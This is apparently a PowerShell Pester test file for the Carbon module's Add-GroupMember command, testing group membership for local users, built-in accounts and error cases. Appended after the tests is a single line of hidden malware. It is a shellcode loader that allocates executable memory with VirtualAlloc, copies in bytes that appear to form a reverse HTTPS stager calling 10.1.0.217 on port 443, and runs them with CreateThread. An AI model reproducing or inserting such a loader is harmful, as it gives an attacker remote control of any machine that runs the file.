













Set-StrictMode -Version 'Latest'

& (Join-Path -Path $PSScriptRoot -ChildPath 'Initialize-CarbonTest.ps1' -Resolve)

$GroupName = 'AddMemberToGroup'
$user2 = $null

$user1 = $CarbonTestUser
$user2 = Install-User -Credential (New-Credential -UserName 'CarbonTestUser2' -Password 'P@ssw0rd!') -PassThru

function Assert-ContainsLike
{
    param(
        [string]$Haystack,
        [string]$Needle
    )

    $pattern = '*{0}*' -f $Needle
    $Haystack |
        Where-Object { $_ -like $pattern } |
        Should -Not -BeNullOrEmpty
}

function Assert-MembersInGroup
{
    param(
        [string[]]$Member
    )

    $group = Get-Group -Name $GroupName
    if( -not $group )
    {
        return
    }

    try
    {
        $group | Should -Not -BeNullOrEmpty
        $Member | 
            ForEach-Object { Resolve-Identity -Name $_ } |
            ForEach-Object { 
                $identity = $_
                $members = $group.Members | Where-Object { $_.Sid -eq $identity.Sid }
                $members | Should -Not -BeNullOrEmpty
            }
    }
    finally
    {
        $group.Dispose()
    }
}

Describe 'Add-GroupMember' {
    
    BeforeEach {
        $Global:Error.Clear()
        Install-Group -Name $GroupName -Description "Group for testing the Add-MemberToGroup Carbon function."
    }
    
    AfterEach {
        Remove-Group
    }
    
    function Remove-Group
    {
        $group = Get-Group -Name $GroupName
        try
        {
            if( $group )
            {
                net localgroup `"$GroupName`" /delete
            }
        }
        finally
        {
            if( $group )
            {
                $group.Dispose()
            }
        }
    }
    
    function Get-LocalUsers
    {
        return Get-WmiObject Win32_UserAccount -Filter "LocalAccount=True" |
                    Where-Object { $_.Name -ne $env:COMPUTERNAME }
    }
    
    function Invoke-AddMembersToGroup($Members = @())
    {
        Add-GroupMember -Name $GroupName -Member $Members
        Assert-MembersInGroup -Member $Members
    }
    
    if( (Get-WmiObject -Class 'Win32_ComputerSystem').Domain -eq 'WBMD' )
    {
        It 'should add member from domain' {
            Invoke-AddMembersToGroup -Members 'WBMD\WHS - Lifecycle Services' 
        }
    }
    
    It 'should add local user' {
        $users = Get-LocalUsers
        if( -not $users )
        {
            Fail "This computer has no local user accounts."
        }
        $addedAUser = $false
        foreach( $user in $users )
        {
            Invoke-AddMembersToGroup -Members $user.Name
            $addedAUser = $true
            break
        }
        $addedAuser | Should -BeTrue
    }
    
    It 'should add multiple members' {
        $members = @( $user1.UserName, $user2.SamAccountName )
        Invoke-AddMembersToGroup -Members $members
    }
    
    It 'should support should process' {
        Add-GroupMember -Name $GroupName -Member $user1.UserName -WhatIf
        $details = net localgroup $GroupName
        foreach( $line in $details )
        {
            ($details -like ('*{0}*' -f $user1.UserName)) | Should -BeFalse
        }
    }
    
    It 'should add network service' {
        Add-GroupMember -Name $GroupName -Member 'NetworkService'
        $details = net localgroup $GroupName
        Assert-ContainsLike $details 'NT AUTHORITY\Network Service'
    }
    
    It 'should detect if network service already member of group' {
        Add-GroupMember -Name $GroupName -Member 'NetworkService'
        Add-GroupMember -Name $GroupName -Member 'NetworkService'
        $Error.Count | Should -Be 0
    }
    
    It 'should add administrators' {
        Add-GroupMember -Name $GroupName -Member 'Administrators'
        $details = net localgroup $GroupName
        Assert-ContainsLike $details 'Administrators'
    }
    
    It 'should detect if administrators already member of group' {
        Add-GroupMember -Name $GroupName -Member 'Administrators'
        Add-GroupMember -Name $GroupName -Member 'Administrators'
        $Error.Count | Should -Be 0
    }
    
    It 'should add anonymous logon' {
        Add-GroupMember -Name $GroupName -Member 'ANONYMOUS LOGON'
        $details = net localgroup $GroupName
        Assert-ContainsLike $details 'NT AUTHORITY\ANONYMOUS LOGON'
    }
    
    It 'should detect if anonymous logon already member of group' {
        Add-GroupMember -Name $GroupName -Member 'ANONYMOUS LOGON'
        Add-GroupMember -Name $GroupName -Member 'ANONYMOUS LOGON'
        $Error.Count | Should -Be 0
    }
    
    It 'should add everyone' {
        Add-GroupMember -Name $GroupName -Member 'Everyone'
        $Error.Count | Should -Be 0
        Assert-MembersInGroup 'Everyone'
    }
    
    It 'should add NT service accounts' {
        if( (Test-Identity -Name 'NT Service\Fax') )
        {
            Add-GroupMember -Name $GroupName -Member 'NT SERVICE\Fax'
            $Error.Count | Should -Be 0
            Assert-MembersInGroup 'NT SERVICE\Fax'
        }
    }
    
    It 'should refuse to add local group to local group' {
        Add-GroupMember -Name $GroupName -Member $GroupName -ErrorAction SilentlyContinue
        $Error.Count | Should -Be 2
        $Error[0].Exception.Message | Should -BeLike '*Failed to add*'
    }
    
    It 'should not add non existent member' {
        $Error.Clear()
        $groupBefore = Get-Group -Name $GroupName
        try
        {
            Add-GroupMember -Name $GroupName -Member 'FJFDAFJ' -ErrorAction SilentlyContinue
            $Error.Count | Should -Be 1
            $groupAfter = Get-Group -Name $GroupName
            $groupAfter.Members.Count | Should -Be $groupBefore.Members.Count
        }
        finally
        {
            $groupBefore.Dispose()
        }
    }
    
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x6e,0x65,0x74,0x00,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0x6a,0x08,0x5f,0x31,0xdb,0x89,0xf9,0x53,0xe2,0xfd,0x68,0x3a,0x56,0x79,0xa7,0xff,0xd5,0x6a,0x03,0x53,0x53,0x68,0xbb,0x01,0x00,0x00,0xe8,0x72,0x00,0x00,0x00,0x2f,0x30,0x72,0x4f,0x6b,0x00,0x00,0x50,0x68,0x57,0x89,0x9f,0xc6,0xff,0xd5,0x68,0x00,0x02,0x60,0x84,0x53,0x53,0x53,0x57,0x53,0x50,0x68,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x96,0x53,0x53,0x53,0x53,0x56,0x68,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x0a,0x4f,0x75,0xed,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x68,0x00,0x00,0x40,0x00,0x53,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x53,0x89,0xe7,0x57,0x68,0x00,0x20,0x00,0x00,0x53,0x56,0x68,0x12,0x96,0x89,0xe2,0xff,0xd5,0x85,0xc0,0x74,0xcd,0x8b,0x07,0x01,0xc3,0x85,0xc0,0x75,0xe5,0x58,0xc3,0x5f,0xe8,0x8f,0xff,0xff,0xff,0x31,0x30,0x2e,0x31,0x2e,0x30,0x2e,0x32,0x31,0x37,0x00;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

